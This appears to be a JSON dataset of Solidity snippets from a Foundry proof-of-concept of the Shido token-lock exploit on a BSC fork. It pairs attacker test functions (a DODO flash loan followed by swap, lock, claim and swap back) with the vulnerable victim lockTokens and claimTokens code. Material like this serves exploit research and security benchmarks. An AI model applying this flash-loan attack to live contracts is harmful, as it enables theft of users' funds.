[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNBToSHIDOINU();\n        LockAndClaimToken();\n        SHIDOToWBNB();\n\n        WBNB.transfer(dodo, baseAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        deal(address(this), 0);\n        vm.createSelectFork(\"bsc\", 29_365_171); // It is recommended to use the quicknode endpoint\n        vm.label(address(SHIDOINU), \"SHIDOINU\");\n        vm.label(address(SHIDO), \"SHIDO\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(ShidoLock), \"ShidoLock\");\n        vm.label(address(FeeFreeRouter), \"FeeFreeRouter\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(dodo), \"dodo\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        DVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IShidoLock",
    "source_type": "victim_contract",
    "function_name": "claimTokens",
    "original_code": "    function claimTokens() external {\n        if (block.timestamp < lockTimestamp) revert WaitNotOver();\n\n        uint256 amount = userShidoV1[msg.sender] * 10 ** 9;\n\n        if (amount == 0) revert ZeroAmount();\n\n        userShidoV1[msg.sender] = 0;\n\n        userShidoV2[msg.sender] += amount;\n\n        IERC20(shidoV2).transferFrom(rewardWallet, msg.sender, amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IShidoLock",
    "source_type": "victim_contract",
    "function_name": "lockTokens",
    "original_code": "    function lockTokens() external {\n        uint256 amount = IERC20(shidoV1).balanceOf(msg.sender);\n\n        if (amount == 0) revert ZeroAmount();\n\n        userShidoV1[msg.sender] += amount;\n\n        IERC20(shidoV1).transferFrom(msg.sender, rewardWallet, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFeeFreeRouter",
    "source_type": "victim_contract",
    "function_name": "addLiquidityETH",
    "original_code": "    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n",
    "description": ""
  }
]